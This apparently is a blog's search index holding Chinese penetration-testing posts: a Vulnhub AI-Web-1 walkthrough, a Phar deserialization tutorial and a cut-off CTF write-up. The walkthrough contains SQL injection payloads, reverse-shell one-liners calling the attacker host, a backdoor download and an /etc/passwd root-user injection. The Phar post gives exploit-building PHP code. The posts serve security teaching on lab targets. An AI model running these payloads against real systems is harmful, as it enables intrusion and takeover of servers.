<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub渗透测试--AI-web1.0</title>
      <link href="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/"/>
      <url>/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/</url>
      
        <content type="html"><![CDATA[<h2 id="Vulnhub渗透测试-AI-web1-0"><a href="#Vulnhub渗透测试-AI-web1-0" class="headerlink" title="Vulnhub渗透测试-AI-web1.0"></a>Vulnhub渗透测试-AI-web1.0</h2><p>在vulnhub.com下载靶机<code>https://www.vulnhub.com/entry/ai-web-1,353/</code></p><blockquote><p>攻击机：kali:192.168.19.132</p><p>靶机：AI-WEB-1.0:192.168.19.133</p><p>（靶机和攻击机需要在同一网段）</p></blockquote><span id="more"></span><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>kali中，使用nmap命令进行探测</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/1.png" alt="image-20220718112311165" style="zoom:80%;"><p>192.168.19.133开放了80端口，访问试试</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/2.png" alt="image-20220718162652898" style="zoom: 50%;"><p>提示：甚至谷歌都没有搜索我的内容！那继续后台扫描<code>dirb http://192.168.19.133</code>（dirb是一个基于字典的web目录扫描工具，查找现有的或隐藏的web对象）</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/3.png" alt="image-20220718163915862" style="zoom:80%;"><p>发现有robots.txt文件存在(robots.txt告知搜索引擎允许或不允许抓取哪些页面)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: /m3diNf0/</span><br><span class="line">Disallow: /se3reTdir777/uploads/</span><br></pre></td></tr></table></figure><p>发现禁止所有搜索引擎访问<code>/m3diNf0/</code>和<code>/se3reTdir777/uploads/</code>页面，没有得到具体有用信息，继续扫描这两个目录</p><p>①探测目录&#x2F;m3diNf0&#x2F;</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/4.png" alt="image-20220718165939102"><p>发现<code>/m3diNf0/</code>目录下还有<code>info.php</code>存在</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/5.png" alt="image-20220718173019605"></p><p><strong>&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213 为网站的绝对路径</strong></p><p>②探测&#x2F;se3reTdir777&#x2F;uploads&#x2F;目录，发现没什么东西，但看这个uploads或许存在文件上传漏洞，接着探测&#x2F;se3reTdir777&#x2F;目录发现有index.php登录页面</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/6.png" alt="image-20220726104038862"></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/7.png" alt="image-20220726104204844"></p><p>首先试试输入单引号，结果报错，说明存在SQL注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>不知道传参的参数名，抓包看看，可以在bp直接进行手工注入</p><h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/8.png" style="zoom: 80%;"><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/9.png" alt="image-20220727102549268" style="zoom: 50%;"><p>下面可以开始爆数据库，表等等，这里使用报错注入</p><p>数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=2&#x27; and (select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#&amp;Operation=Submit</span><br></pre></td></tr></table></figure><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/10.png" alt="image-20220727103350832" style="zoom:50%;"><p>表：systemUser,user</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=2&#x27; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))#&amp;Operation=Submit</span><br></pre></td></tr></table></figure><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/11.png" alt="image-20220727103616716" style="zoom: 50%;"><p>字段名：id,userName,password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=2&#x27; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;systemUser&#x27;))))#&amp;Operation=Submit</span><br></pre></td></tr></table></figure><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/12.png" alt="image-20220727110021365" style="zoom:50%;"><p>值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=2&#x27; and (select extractvalue(1,concat(0x7e,(select group_concat(concat_ws(&#x27;:&#x27;,userName,password))from aiweb1.systemUser))))#&amp;Operation=Submit</span><br></pre></td></tr></table></figure><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/13.png" alt="image-20220727112857391" style="zoom:50%;"><p>发现它是name、password登录，但没有这样的登录页面，简言之，没用</p><h4 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><p>爆库：（1）aiweb1、（2）information_schema</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/14.png" alt="image-20220726171504785" style="zoom: 67%;"><p>发现可通过基于错误的盲注，基于时间的盲注，联合查询来实现SQL注入</p><p>爆表：</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/15.png" alt="image-20220727172823364" style="zoom: 67%;"><p>爆字段名、值：</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/16.png" alt="image-20220727215931022" style="zoom:67%;"><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>在渗透测试或者漏洞评估的过程中，提权是非常重要的一步，对于渗透来说，获得的权限越高，控制的服务器就会越多。首先通过漏洞获取webshell，然后通过shell进行提权。</p><p>权限分级：</p><p>匿名访问权限、来宾权限、用户权限、管理员权限、系统权限</p><p><strong>什么是shell?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell是一种应用程序，提供一个界面，用户通过这个界面访问操作系统内核的服务。</span><br><span class="line">正向shell：我主动连接服务器，服务器开启ssh端口</span><br><span class="line">反向shell：服务器主动连接我，我监听某一端口</span><br></pre></td></tr></table></figure><h4 id="采用手工注入下的反弹"><a href="#采用手工注入下的反弹" class="headerlink" title="采用手工注入下的反弹"></a>采用手工注入下的反弹</h4><h5 id="尝试into-outfile来获取shell"><a href="#尝试into-outfile来获取shell" class="headerlink" title="尝试into outfile来获取shell"></a>尝试into outfile来获取shell</h5><p>上面在<code>/m3diNf0/</code>目录下发现了网站的绝对路径<code>/home/www/html/web1x443290o2sdf92213</code></p><p>在文件上传&#x2F;se3reTdir777&#x2F;uploads目录下写入一句话木马</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/17.png" alt="image-20220727145948217" style="zoom:50%;"><p>蚁剑连接成功</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/18.png" alt="image-20220727151115199" style="zoom:50%;"><h5 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell:"></a><strong>反弹shell</strong>:</h5><p><strong>Linux反弹shell</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">攻击机：nc -lvvp <span class="number">6666</span></span><br><span class="line">客户机：bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">19.132</span>/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>这个IP是攻击机的IP</span><br><span class="line">  受害者执行的命令不会在本机上回显，会在攻击机上回显</span><br><span class="line">   上述命令解释：</span><br><span class="line">bash -i创建一个交互式的bash</span><br><span class="line">&gt;&amp;   将输出重定向到文件</span><br><span class="line">/dev目录  存放linux操作系统的各种设备</span><br><span class="line">/dev/tcp文件不存在，但是打开该文件相当于发起了socket，建立了一个连接</span><br><span class="line">/<span class="number">192.168</span>.<span class="number">19.132</span>/<span class="number">6666</span>  表示socket连接的ip和端口</span><br><span class="line"><span class="number">0</span>&gt;&amp;<span class="number">1</span>表示标准输入重定向到标准输出，即我们可以远程输入，并且可以得到远程的输出</span><br><span class="line">Linux反弹shell其他方法：</span><br><span class="line">    base64变形：&#123;<span class="keyword">echo</span>,YmFzaCUyMC1pJTIwJTNFJTI2JTIwL2Rldi90Y3AvMTkyLjE2OC4xOS4xMzIvNjY2NiUyMDAlM0UlMjYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">    nc方式：nc -e /bin/sh <span class="number">192.168</span>.<span class="number">19.132</span> <span class="number">6666</span></span><br><span class="line">    python变形：python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.19.132&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">    服务器很多“-e”功能删除了：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">192.168</span>.<span class="number">19.132</span> <span class="number">6666</span> &gt;/tmp/f</span><br><span class="line">    奇怪方法<span class="number">1</span>：exec <span class="number">5</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">4444</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;$<span class="number">5</span> &gt;$<span class="number">5</span>; done</span><br><span class="line"> 奇怪方法<span class="number">2</span>：<span class="number">0</span>&lt;&amp;<span class="number">196</span>;exec <span class="number">196</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">4444</span>; sh &lt;&amp;<span class="number">196</span> &gt;&amp;<span class="number">196</span> <span class="number">2</span>&gt;&amp;<span class="number">196</span></span><br></pre></td></tr></table></figure><p>先尝试简单的命令<code>nc -e /bin/sh 192.168.19.132 6666</code>，提示-e功能没有（<strong>提醒：IP地址为攻击机的IP地址</strong>）</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/19.png" alt="image-20220727220612523"></p><p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.19.132 6666 &gt;/tmp/f</code>，反弹成功</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/20.png" alt="image-20220727220839285" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解释一下上面语言的含义：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.19.132 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>为了方便，使用命令<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>进入交互式shell</p><h4 id="采用sqlmap反弹shell"><a href="#采用sqlmap反弹shell" class="headerlink" title="采用sqlmap反弹shell"></a>采用sqlmap反弹shell</h4><h5 id="尝试–os-shell拿shell"><a href="#尝试–os-shell拿shell" class="headerlink" title="尝试–os-shell拿shell"></a>尝试–os-shell拿shell</h5><p>–os-shell使用条件：</p><p>1、需要知道网站的路径</p><p>2、路径要求可写权限</p><p>3、要有注入点</p><p>使用–os-shell拿shell，需要知道网站的绝对路径，上面在<code>/m3diNf0/</code>目录下发现了网站的绝对路径<code>/home/www/html/web1x443290o2sdf92213</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;192.168.19.133/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> --os-shell</span><br></pre></td></tr></table></figure><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/21.png" alt="image-20220728100506513" style="zoom:67%;"><h5 id="反弹shell-2"><a href="#反弹shell-2" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>进入&#x2F;uploads目录下查看，写入shell成功</p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/22.png" alt="image-20220728105243924" style="zoom:67%;"><p>方法①：通过靶机wget一个php后门来反弹shell</p><p>（1）自己写一个php后门文件</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/23.png" alt="image-20220728213915642"></p><p>（2）在攻击机（kali）上运行临时服务器服务，命令：<code>python -m SimpleHTTPServer 8000</code>，在靶机AI-web上下载php后门文件shell.php，命令：<code> wget http://192.168.19.132:8000/shell.php</code></p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/24.png" alt="image-20220728232812965" style="zoom:67%;"><p>（3）攻击机kali监听4444端口来获取靶机的回显内容，靶机运行shell.php实现反弹</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/25.png" alt="image-20220728233454592"></p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/26.png" alt="image-20220728233516034" style="zoom: 80%;"><p>方法②：使用msf生成一个python脚本，端口号7777</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/27.png" alt="image-20220730170636543"></p><p>复制到os-shell中运行，攻击机kali开启监听</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/28.png" alt="image-20220730171531243"></p><p>从上图可以看出，攻击机kali控制了客户机的查询和显示</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>反弹shell后，whoami查询客户机的身份是www-data，查看&#x2F;etc&#x2F;passwd文件属性</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/29.png" alt="image-20220730175732847"></p><p>从图中可知，www-data对&#x2F;etc&#x2F;passwd有读写权限，那么可以在&#x2F;etc&#x2F;passwd文件中添加一个root权限的用户进行提权</p><p>（1）上面sql注入发现用户密码是以密文形式存在，需要使用openssl工具加密密码，例如创建一个用户：用户名：smile，密码：root。命令：<code>openssl passwd -1 -salt smile root</code></p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/30.png" alt="image-20220730193550926"></p><p>（2）将刚才生成的密码进行整理，生成&#x2F;etc&#x2F;passwd文件格式的字符串：<code>smile:$1$smile$ke8VJgTwlvwgYylHGBuVK1.:0:0::/root:/bin/bash</code></p><p>（3）将字符串添加至&#x2F;etc&#x2F;passwd文件中，命令：<code>echo &#39;smile:$1$smile$ke8VJgTwlvwgYylHGBuVK1.:0:0::/root:/bin/bash&#39; &gt;&gt; /etc/passwd</code>，在os-shell反弹shell下，在靶机上使用python弹一个交互式shell，命令：<code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/31.png" alt="image-20220730210519807"></p><p>成功写入&#x2F;etc&#x2F;passwd文件中，登录root权限用户</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/32.png" alt="image-20220730235736683"></p><p>flag在&#x2F;root目录下，切换至&#x2F;root目录拿到flag</p><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/33.png" alt="image-20220730235924125"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试、SQL注入、反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar反序列化</title>
      <link href="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Web基础—PHP反序列化漏洞–Phar反序列化"><a href="#Web基础—PHP反序列化漏洞–Phar反序列化" class="headerlink" title="Web基础—PHP反序列化漏洞–Phar反序列化"></a>Web基础—PHP反序列化漏洞–Phar反序列化</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="phar简介"><a href="#phar简介" class="headerlink" title="phar简介"></a>phar简介</h4><p>phar全称PHP Archive，phar扩展提供了一种将整个PHP文件打包而成的一种压缩文档，类似Java中的jar包。<code>.phar</code>文件的最大特点是以序列化的形式储存用户自定义的meta-data。以扩展反序列化漏洞的攻击面，配合phar:&#x2F;&#x2F;协议使用。</p><span id="more"></span><h4 id="phar反序列化简介"><a href="#phar反序列化简介" class="headerlink" title="phar反序列化简介"></a>phar反序列化简介</h4><p>PHP反序列化常见的是使用unserilize()进行反序列化，除此以外还有其他的反序列化方法，不需要用到unserilize()。例如phar反序列化。</p><h3 id="Phar基础"><a href="#Phar基础" class="headerlink" title="Phar基础"></a>Phar基础</h3><h4 id="what文件结构"><a href="#what文件结构" class="headerlink" title="what文件结构"></a>what文件结构</h4><p>一个phar文件一般分成四部分</p><blockquote><p>1、a stub<br>可以理解为一个标志，格式为:<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>,必须以<code>__HALT_COMPILER()</code>;结尾（类似于文件头），否则phar扩展将无法识别这个文件为phar文件<br>2、a manifest describing the contents<br>phar文件本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会<strong>以序列化的形式存储用户自定义的meta-data</strong>，这是上述攻击手法最核心的地方</p><p>3、the file contents</p><p>被压缩文件的内容</p><p>4、[optional] a signature for verifying Phar integrity </p><p>签名，放在文件末尾</p></blockquote><h4 id="how生成phar文件"><a href="#how生成phar文件" class="headerlink" title="how生成phar文件"></a>how生成phar文件</h4><p>生成phar文件需要php.ini文件中phar.readonly设置为Off</p><p>phar.php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成phar文件</p><img src="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt="image-20220502220833830"><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt="img"></p><p>利用类的魔术方法对phar文件进行反序列化；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar://test.phar/flag.txt&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt="image-20220502234504883"></p><h4 id="how伪造phar文件"><a href="#how伪造phar文件" class="headerlink" title="how伪造phar文件"></a>how伪造phar文件</h4><p>php通过识别phar文件的stub将其判断为phar文件，即<code>__HALT_COMPILER()</code>语句，对前面的内容和后缀名没有要求。那就可以通过添加任意的文件头或者修改后缀名的方式将phar文件伪装成其他格式的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt="image-20220502235732460"><h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、phar文件要能够上传到服务器端</p><p>2、要有可用的魔术方法作为“跳板”</p><p>3、文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
            <tag> Phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022网刃杯</title>
      <link href="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/"/>
      <url>/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="比赛复现—2022网刃杯WP"><a href="#比赛复现—2022网刃杯WP" class="headerlink" title="比赛复现—2022网刃杯WP"></a>比赛复现—2022网刃杯WP</h2><p>第一次比赛做出2题，继续加油。</p><span id="more"></span><h4 id="ICS–easyiec"><a href="#ICS–easyiec" class="headerlink" title="ICS–easyiec"></a>ICS–easyiec</h4><p>流量分析</p><p>题目标题提醒了iec，筛选了iec60870_104，再进行追踪tcp流，发现了flag</p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/1.png"></p><h4 id="ICS–xyp07"><a href="#ICS–xyp07" class="headerlink" title="ICS–xyp07"></a>ICS–xyp07</h4><p>加密文件</p><p>用winhex打开，在最后发现base64加密，反复解密得到文件加密密码<code>Xyp77&amp;7&amp;77</code></p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/2.png"></p><p>用科来网络分析系统进行重放404，发现序号为1425的数据包有问题</p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/3.png" alt="3"></p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/4.png" alt="image-20220424173203260"></p><p>base91解码得到flag</p><h4 id="web–upload"><a href="#web–upload" class="headerlink" title="web–upload"></a>web–upload</h4><p>实则是sql注入</p><p>filename处存在sql注入，使用报错注入：</p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/5.png" alt="image-20220424211427455"></p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/6.png" alt="image-20220424211157605"></p><h3 id="复现其他题目"><a href="#复现其他题目" class="headerlink" 